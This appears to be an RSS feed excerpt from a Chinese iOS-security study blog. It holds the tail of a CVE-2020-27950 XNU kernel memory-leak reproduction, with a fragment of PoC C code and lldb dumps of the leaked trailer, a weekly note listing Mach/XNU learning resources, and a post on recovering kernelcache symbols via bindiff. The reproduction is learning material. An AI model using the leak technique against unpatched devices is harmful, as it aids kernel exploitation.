	        &lt;span class=&quot;n&quot;&gt;MACH_PORT_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	
	&lt;span class=&quot;n&quot;&gt;mach_msg_mac_trailer_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;trailer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_mac_trailer_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] Leaked value: %x&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;trailer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_ad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;使用XCode调试，新建一个iOS应用，运行在12.4的iPhone 6上，把Poc代码插入运行&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/Users/wnagzihxa1n/Library/Application Support/typora-user-images/image-20210131014355471.png&quot; alt=&quot;image-20210131014355471&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我这里发现了一个XCode解析结构体的问题，按照结构体定义，我标出了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msgh_audit&lt;/code&gt;的数组位置，在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;val[7]&lt;/code&gt;后面，是64位长度的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msgh_context&lt;/code&gt;，但是这里解析出错，因为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4714839257292734464&lt;/code&gt;是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x416e795300000000&lt;/code&gt;，修正结构体偏移后，在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msgh_ad&lt;/code&gt;的位置上是我们提前设置的数据&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x416e7953&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lldb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_mac_trailer_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x000000010fe00cdc&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_mac_trailer_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;msgh_trailer_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;msgh_trailer_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;68&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;msgh_seqno&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;msgh_sender&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;501&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;501&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;msgh_audit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4294967295&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;501&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;501&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;501&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;501&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;605&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1792&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;msgh_context&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4714839257292734464&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;msgh_ad&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;msgh_labels&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lldb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;trailer&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0x10fe00cdc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000000&lt;/span&gt;         &lt;span class=&quot;mh&quot;&gt;0x00000044&lt;/span&gt;         &lt;span class=&quot;mh&quot;&gt;0x00000000&lt;/span&gt;         &lt;span class=&quot;mh&quot;&gt;0x000001f5&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0x10fe00cec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x000001f5&lt;/span&gt;         &lt;span class=&quot;mh&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x000001f5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x000001f5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0x10fe00cfc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x000001f5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x000001f5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000025d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0x10fe00d0c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000700&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000000&lt;/span&gt;         &lt;span class=&quot;mh&quot;&gt;0x00000000&lt;/span&gt;         &lt;span class=&quot;mh&quot;&gt;0x416e7953&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_ad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0x10fe00d1c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_labels&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000000&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xf0000000&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000000&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;现在成功泄露出内核数据&lt;/p&gt;

&lt;p&gt;那我们如何泄露出一个有用的内核数据呢？&lt;/p&gt;

&lt;p&gt;咱们下次再聊&lt;/p&gt;

&lt;p&gt;关于符号的问题，我在漏洞复现结束后突发奇想，既然五个函数都有同样的问题，那么说明五个函数漏洞场景肯定是相同的，所以搜索以下这句代码&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;trailer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_trailer_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;妥了，五个函数都在这里了&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/Users/wnagzihxa1n/Library/Application Support/typora-user-images/image-20210131014338924.png&quot; alt=&quot;image-20210131014338924&quot; /&gt;&lt;/p&gt;
</description>
                <pubDate>Tue, 12 Jan 2021 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/ios_security/2021/01/12/CVE-2020-27950-msgh_ad%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.html</link>
                <guid isPermaLink="true">http://localhost:4000/ios_security/2021/01/12/CVE-2020-27950-msgh_ad%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2021.01.08 我，零基础，学iOS/macOS安全</title>
                <description>&lt;p&gt;上周末发的红包好像被薅羊毛了，下次我发的时候设个暗号&lt;/p&gt;

&lt;p&gt;有一些读者朋友跟我交流，说想一起研究iOS/macOS安全&lt;/p&gt;

&lt;p&gt;我简单说一下我的情况，最早我是玩的Windows，想不到吧&lt;/p&gt;

&lt;p&gt;大二那一年的暑假，我一个人在家里捣鼓了两个月，那时买不到正版的《0day2》，我就打印了一本，说真的，特痛苦，因为是黑白的，很多内存数据都看不清，这玩意单步调试就改的就是内存里一个字节，眼睛都快看瞎了，好在后来找到了一个彩色版本的电子书，拯救了我&lt;/p&gt;

&lt;p&gt;后来因为专业课的原因，我开始学习安卓开发，有一次在吾爱破解上面找破解软件，找着找着我就看到了安卓逆向的帖子，所以就掉进移动安全的坑里了&lt;/p&gt;

&lt;p&gt;再后来大家也都知道了，毕业后搞安卓APT，然后又搞应用漏洞&lt;/p&gt;

&lt;p&gt;说回系统学习macOS安全这事，我每周照例记录进度和资料分享，只是我个人的规划，不是团队KPI，毕竟我现在只是一个卖鞋的，就这么简单&lt;/p&gt;

&lt;p&gt;我的学习方式就是自己搭建知识体系，就像搞逆向，我会先学习开发，同样，我会学习macOS平台的各种知识&lt;/p&gt;

&lt;p&gt;这周在研究的一个问题就是kernelcache的符号，大家有兴趣可以去翻前两天的文章《&lt;a href=&quot;https://mp.weixin.qq.com/s/4uJMMkCrIR9kk45TGBZxAQ&quot;&gt;关于恢复kernelcache符号的问题&lt;/a&gt;》，我详细记录了我遇到这个问题后是如何思考与解决的&lt;/p&gt;

&lt;p&gt;我刚开始学习，想到的方法肯定不是最好的，希望搞iOS系统安全的师傅们能多指点我一下&lt;/p&gt;

&lt;p&gt;CVE-2020-27950，XNU内核信息泄露&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.synacktiv.com/en/publications/ios-1-day-hunting-uncovering-and-exploiting-cve-2020-27950-kernel-memory-leak.html#&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;关于这个漏洞，我学着学着才发现这对我来说简直是大坑，其中各种奇奇怪怪的知识点，不过也好，东拼西凑的学会了不少东西了，现在在看Mach Message，Mach Port相关的，先从正面使用入手，然后看源码流程，掌握其中一些比较常见的结构体，比如&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mach_msg_trailer_t&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;mach_msg&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://web.mit.edu/darwin/src/modules/xnu/osfmk/man/mach_msg.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;mach_msg_header&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://web.mit.edu/darwin/src/modules/xnu/osfmk/man/mach_msg_header.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Mach 原语-学习笔记&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://www.kobeluo.com/tech/2016/10/31/studyNote-Mach/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;iOS Jailbreak Principles - Sock Port 漏洞解析（二）通过 Mach OOL Message 泄露 Port Address&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://juejin.cn/post/6844904003675881485&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Mach ports&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;RunLoop深度探究（二）&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.jianshu.com/p/6582c47a13c8&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;再看CVE-2016-1757—浅析mach message的使用&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://turingh.github.io/2016/07/05/%E5%86%8D%E7%9C%8BCVE-2016-1757%E6%B5%85%E6%9E%90mach%20message%E7%9A%84%E4%BD%BF%E7%94%A8/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;joker和jtool2，用于分析kernelcache文件&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://www.newosxbook.com/tools/joker.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;macOS内核扩展漏洞挖掘指导流程，我要学的还有很多很多很多&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.anquanke.com/post/id/146857#h2-15&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;IDA Pro 7.5 SP3（x86, x64, ARM, ARM64, PPC, PPC64, MIPS)&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bbs.pediy.com/thread-264354.htm&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;想买三本书学习，看了目录感觉不错，就是现在不好买，尤其是第三本&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/4A57BC9D014DD4CD283AC830B332DC20.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;第一本我发现了一个下载链接，但是打不开&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://universa.unijales.edu.br/099105556x_macos_and_ios_internals_volume_i_user_mode_v12.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;作者放出了第三本的部分章节，合起来大概六七十页&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://newosxbook.com/QiLin/qilin.pdf&lt;/li&gt;
  &lt;li&gt;http://newosxbook.com/files/PhJB.pdf&lt;/li&gt;
  &lt;li&gt;http://newosxbook.com/free/security12deltae.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;有人做了个合集&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://geosn0w.github.io/j/bookreader/thebook.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;本想着找tangsilian师傅借一下第三本看看，师傅说送我一本，那我就当师傅资源入股了，等我RJB给师傅送一辆911过去&lt;/p&gt;

&lt;p&gt;对了，作者还有一个论坛&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://newosxbook.com/forum/index.php&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;《Mac OS® X and iOS Internals TO THE APPLE’S CORE》的电子版，它的中文译本《深入解析Mac OS X &amp;amp; iOS操作系统》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://newosxbook.com/MOXiI.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;苹果这次终于不扭扭捏捏的了&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://opensource.apple.com/tarballs/xnu/xnu-7195.50.7.100.1.tar.gz&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;再贴两个资源贴，前者各种漏洞汇总，后者各种书籍PDF，非常全面&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/Proteas/apple-cve&lt;/li&gt;
  &lt;li&gt;https://github.com/writeups/iOS&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;接下来是吃瓜时间&lt;/p&gt;

&lt;p&gt;前几天吃了个pdd的瓜，说是pdd的安全总监因为没拿到公司该给的期权离职了，还要打官司，pdd以后叫瓜多多吧&lt;/p&gt;

&lt;p&gt;想来我在安全圈混了这么些年，结果这些大佬一个都不熟，吃个瓜也都是二手的，流泪&lt;/p&gt;

&lt;p&gt;另一件事就是MJ从360离职了，是的，MJ我也不熟，但是这三年来我在360很多朋友都走了，我一个卖鞋的听到这些，恍如隔世&lt;/p&gt;

&lt;p&gt;下周的学习应该是动态调试一下XNU内核了，到时候看看是拿虚拟机还是真机，搜了下有不少的解决方案&lt;/p&gt;

&lt;p&gt;iPhone的环境也捣鼓一下，我手上有个水果6，可越狱的版本，刚好可以拿来研究学习&lt;/p&gt;
</description>
                <pubDate>Fri, 08 Jan 2021 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2021/01/08/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2021.01.08.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2021/01/08/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2021.01.08.html</guid>
            </item>
        
            <item>
                <title>关于恢复kernelcache符号的问题</title>
                <description>&lt;p&gt;&lt;strong&gt;PDF版本请点击&lt;a href=&quot;/assets/pdf/%E5%85%B3%E4%BA%8E%E6%81%A2%E5%A4%8Dkernelcache%E7%AC%A6%E5%8F%B7%E7%9A%84%E9%97%AE%E9%A2%98.pdf&quot;&gt;此处&lt;/a&gt;下载&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;太长不看版：流水账啥结论都没有&lt;/p&gt;

&lt;p&gt;作为一个初级iOS安全研究爱好者，我在近期的漏洞复现实践中遇到了一个问题，就是如何恢复符号&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.synacktiv.com/en/publications/ios-1-day-hunting-uncovering-and-exploiting-cve-2020-27950-kernel-memory-leak.html#&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;作者先通过bindiff发现了八个函数是有差异的，然后推出其中五个是添加了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bzero&lt;/code&gt;函数的结论，这是怎么看出来的？&lt;/p&gt;

&lt;p&gt;接着又说通过joker工具结合XNU源码可以确定几个有差异的函数是下面这几个，我对照着做的时候发现这里并不像作者说的这么简单&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/Users/wnagzihxa1n/Library/Application Support/typora-user-images/image-20210131150554244.png&quot; alt=&quot;image-20210131150554244&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我按照时间线的形式来记录我在遇到这个问题时是如何思考与解决的&lt;/p&gt;

&lt;p&gt;我下载了12.4.8和12.4.9两个版本的固件，其中12.4.8是漏洞版本，12.4.9是补丁版本&lt;/p&gt;

&lt;p&gt;解压缩ipsw固件包，获取压缩后的kernelcache文件，再使用lzssdec进行解压缩kernelcache，获取到可反编译kernelcache文件&lt;/p&gt;

&lt;p&gt;以下将12.4.8的kernelcache记为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kc_12.4.8&lt;/code&gt;，将12.4.9的kernelcache记为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kc_12.4.9&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;当我在macOS平台用IDA 7.0反编译&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kc_12.4.8&lt;/code&gt;的时候，我发现了符号的问题，真的是一丁点都没有，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kc_12.4.9&lt;/code&gt;也是如此&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/Users/wnagzihxa1n/Library/Application Support/typora-user-images/image-20210131150624263.png&quot; alt=&quot;image-20210131150624263&quot; /&gt;&lt;/p&gt;

&lt;p&gt;使用bindiff进行比对，发现比对结果与作者有所差别，这里猜测是因为我使用的是IDA 7.0，对应的bindiff是5导致的，IDA 7.5可以使用bindiff 6&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/Users/wnagzihxa1n/Library/Application Support/typora-user-images/image-20210131150642325.png&quot; alt=&quot;image-20210131150642325&quot; /&gt;&lt;/p&gt;

&lt;p&gt;进入到作者所说的函数，添加的是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_FFFFFFF00766D6C0&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/Users/wnagzihxa1n/Library/Application Support/typora-user-images/image-20210131150657988.png&quot; alt=&quot;image-20210131150657988&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在IDA里找到这个函数，想不明白作者是如何通过这种代码判断出来这是一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bzero()&lt;/code&gt;函数的&lt;/p&gt;

